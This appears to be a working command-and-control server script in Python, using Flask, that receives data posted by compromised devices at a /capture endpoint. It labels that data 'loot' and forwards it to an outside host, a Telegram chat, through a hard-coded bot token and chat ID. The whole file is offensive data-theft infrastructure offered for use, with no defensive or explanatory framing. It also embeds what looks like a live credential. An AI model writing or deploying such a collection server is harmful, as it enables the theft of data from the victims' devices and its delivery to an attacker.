import os
from flask import Flask, request, jsonify
from telegram import Bot
import asyncio

app = Flask(__name__)

# --- CONFIGURATION ---
BOT_TOKEN = "8235938259:AAHKUkRiP8caT6Y7bY-qRhpc324udS3aXP0"
CHAT_ID = "8515760823"
# --------------------

async def send_telegram_msg(text):
    try:
        bot = Bot(token=BOT_TOKEN)
        await bot.send_message(chat_id=CHAT_ID, text=text)
    except Exception as e:
        print(f"Error sending telegram: {e}")

@app.route('/')
def home():
    return "C2 Server is Active", 200

@app.route('/capture', methods=['POST'])
async def capture():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400
    
    # Format the loot for the Telegram notification
    loot_msg = f"📦 NEW LOOT CAPTURED!\n\nDevice: {data.get('device', 'Unknown')}\nData: {data.get('payload', 'No data')}"
    
    # Send to your Telegram
    await send_telegram_msg(loot_msg)
    
    return jsonify({"status": "success", "message": "Loot stored in vault"}), 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)